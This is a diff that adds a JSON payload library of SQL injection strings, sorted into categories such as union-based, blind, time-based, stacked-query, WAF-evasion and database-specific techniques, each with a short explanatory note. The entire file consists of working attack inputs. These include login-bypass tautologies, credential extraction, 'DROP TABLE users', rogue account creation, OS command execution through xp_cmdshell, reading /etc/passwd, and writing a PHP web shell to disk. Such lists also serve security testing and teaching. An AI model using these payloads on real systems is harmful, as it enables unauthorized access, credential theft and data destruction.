@@ -1,0 +1,260 @@
+{
+  "categories": [
+    {
+      "id": "basic_union",
+      "title": "Union-Based Injection",
+      "description": "Extract data by appending UNION SELECT statements to retrieve information from other tables.",
+      "items": [
+        {
+          "payload": "1' UNION SELECT NULL,NULL,NULL--",
+          "note": "Basic UNION injection to determine column count"
+        },
+        {
+          "payload": "1' UNION SELECT username,password,email FROM users--",
+          "note": "Extract user credentials (if column count matches)"
+        },
+        {
+          "payload": "' UNION SELECT @@version,user(),database()--",
+          "note": "Retrieve MySQL version and current user"
+        },
+        {
+          "payload": "1 UNION SELECT table_name,column_name,data_type FROM information_schema.columns--",
+          "note": "Enumerate database structure"
+        }
+      ]
+    },
+    {
+      "id": "error_based",
+      "title": "Error-Based Injection",
+      "description": "Trigger database errors to extract information from error messages.",
+      "items": [
+        {
+          "payload": "1' AND extractvalue(1,concat(0x7e,(SELECT database())))--",
+          "note": "MySQL extractvalue() technique to leak database name"
+        },
+        {
+          "payload": "1' AND updatexml(1,concat(0x7e,(SELECT user())),1)--",
+          "note": "MySQL updatexml() for information disclosure"
+        },
+        {
+          "payload": "1 AND 1=CAST((SELECT COUNT(*) FROM information_schema.columns) AS INT)--",
+          "note": "SQL Server error-based enumeration"
+        },
+        {
+          "payload": "' OR 1=CONVERT(int,(SELECT @@version))--",
+          "note": "SQL Server version extraction via error"
+        }
+      ]
+    },
+    {
+      "id": "boolean_blind",
+      "title": "Boolean-Based Blind Injection",
+      "description": "Infer database content through true/false responses without direct output.",
+      "items": [
+        {
+          "payload": "1' AND (SELECT COUNT(*) FROM users) > 0--",
+          "note": "Check if users table exists"
+        },
+        {
+          "payload": "1' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0--",
+          "note": "Verify admin user existence"
+        },
+        {
+          "payload": "1' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'--",
+          "note": "Blind brute-force character extraction"
+        },
+        {
+          "payload": "1' AND CASE WHEN (SELECT COUNT(*) FROM users)>5 THEN 1 ELSE 0 END--",
+          "note": "Conditional logic for data retrieval"
+        }
+      ]
+    },
+    {
+      "id": "time_based",
+      "title": "Time-Based Blind Injection",
+      "description": "Exploit time delays to infer query results through response timing.",
+      "items": [
+        {
+          "payload": "1' AND SLEEP(5)--",
+          "note": "Unconditional 5 second delay in MySQL"
+        },
+        {
+          "payload": "1' AND IF(1=1,SLEEP(5),0)--",
+          "note": "Conditional sleep - delays if condition is true"
+        },
+        {
+          "payload": "1' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--",
+          "note": "Time-based data extraction"
+        },
+        {
+          "payload": "1' AND WAITFOR DELAY '00:00:05'--",
+          "note": "SQL Server time-based injection"
+        },
+        {
+          "payload": "1' AND BENCHMARK(5000000,MD5('test'))--",
+          "note": "MySQL CPU-intensive benchmark technique"
+        }
+      ]
+    },
+    {
+      "id": "tautology",
+      "title": "Tautology-Based Injection",
+      "description": "Always-true conditions to bypass authentication or extract entire datasets.",
+      "items": [
+        {
+          "payload": "' OR '1'='1",
+          "note": "Classic tautology - bypasses login validation"
+        },
+        {
+          "payload": "admin' OR '1'='1' --",
+          "note": "Tautology with comment to ignore remaining SQL"
+        },
+        {
+          "payload": "' OR 1=1 --",
+          "note": "Numeric tautology variant"
+        },
+        {
+          "payload": "' OR 'a'='a",
+          "note": "String tautology without comment"
+        }
+      ]
+    },
+    {
+      "id": "stacked_queries",
+      "title": "Stacked Queries (Multiple Statements)",
+      "description": "Execute multiple SQL statements to modify data or system configuration.",
+      "items": [
+        {
+          "payload": "1'; DROP TABLE users--",
+          "note": "Destructive stacked query (if database allows multiple statements)"
+        },
+        {
+          "payload": "1'; INSERT INTO users VALUES ('hacker','password123')--",
+          "note": "Create unauthorized user account"
+        },
+        {
+          "payload": "1'; UPDATE users SET role='admin' WHERE id=1--",
+          "note": "Privilege escalation via UPDATE"
+        },
+        {
+          "payload": "1'; EXEC xp_cmdshell 'whoami'--",
+          "note": "SQL Server OS command execution (requires permissions)"
+        }
+      ]
+    },
+    {
+      "id": "second_order",
+      "title": "Second-Order / Stored Injection",
+      "description": "Inject payloads that get stored and executed later (stored XSS in SQL context).",
+      "items": [
+        {
+          "payload": "admin' OR '1'='1' /*",
+          "note": "Payload stored in database, triggered on retrieval"
+        },
+        {
+          "payload": "'; UPDATE users SET password='hacked' WHERE id=1; /*",
+          "note": "Stored injection executing on SELECT"
+        }
+      ]
+    },
+    {
+      "id": "advanced",
+      "title": "Advanced Techniques",
+      "description": "Complex evasion and exploitation methods.",
+      "items": [
+        {
+          "payload": "1' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--",
+          "note": "Enumerate all tables in current database"
+        },
+        {
+          "payload": "1' AND (SELECT COUNT(DISTINCT table_name) FROM information_schema.columns)>0--",
+          "note": "Detect information_schema availability"
+        },
+        {
+          "payload": "1' ORDER BY 1-- UNION SELECT NULL,version(),NULL--",
+          "note": "Combine ORDER BY with UNION for column mapping"
+        },
+        {
+          "payload": "1' WHERE id IN (SELECT user_id FROM admins)--",
+          "note": "Subquery injection in WHERE clause"
+        },
+        {
+          "payload": "1'; DECLARE @cmd VARCHAR(MAX) SET @cmd='...' EXEC(@cmd)--",
+          "note": "SQL Server dynamic execution"
+        }
+      ]
+    },
+    {
+      "id": "encoding",
+      "title": "Encoding & Obfuscation Evasion",
+      "description": "Bypass filters and WAF protection using encoding techniques.",
+      "items": [
+        {
+          "payload": "1' /*!50000UNION*/ SELECT 1,2,3--",
+          "note": "MySQL version-specific comment for WAF bypass"
+        },
+        {
+          "payload": "1' %55%4e%49%4f%4e SELECT 1,2,3--",
+          "note": "URL-encoded UNION (when input is URL-decoded)"
+        },
+        {
+          "payload": "1' UNION/**/SELECT 1,2,3--",
+          "note": "Comment-based space bypass"
+        },
+        {
+          "payload": "1' UNION%0aSELECT 1,2,3--",
+          "note": "Newline character bypass for filters"
+        }
+      ]
+    },
+    {
+      "id": "mysql_specific",
+      "title": "MySQL-Specific Techniques",
+      "description": "Exploitation methods specific to MySQL database.",
+      "items": [
+        {
+          "payload": "1' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--",
+          "note": "Read local files with LOAD_FILE()"
+        },
+        {
+          "payload": "1' INTO OUTFILE '/tmp/shell.php' SELECT '<?php system($_GET[\"cmd\"]); ?>'--",
+          "note": "Write PHP shell to filesystem (if permissions allow)"
+        },
+        {
+          "payload": "1' AND @@version LIKE '5.%'--",
+          "note": "Detect MySQL version"
+        }
+      ]
+    },
+    {
+      "id": "mssql_specific",
+      "title": "SQL Server-Specific Techniques",
+      "description": "Exploitation methods specific to Microsoft SQL Server.",
+      "items": [
+        {
+          "payload": "1' UNION SELECT @@servername, @@servicename, NULL--",
+          "note": "Retrieve SQL Server metadata"
+        },
+        {
+          "payload": "1'; EXEC xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion','ProductName'--",
+          "note": "OS information extraction via registry"
+        }
+      ]
+    },
+    {
+      "id": "postgresql_specific",
+      "title": "PostgreSQL-Specific Techniques",
+      "description": "Exploitation methods specific to PostgreSQL database.",
+      "items": [
+        {
+          "payload": "1' UNION SELECT version(),NULL,NULL--",
+          "note": "Retrieve PostgreSQL version"
+        },
+        {
+          "payload": "1'; COPY (SELECT usename,passwd FROM pg_user) TO '/tmp/users.txt'--",
+          "note": "Dump user credentials to file"
+        }
+      ]
+    }
+  ]
+}
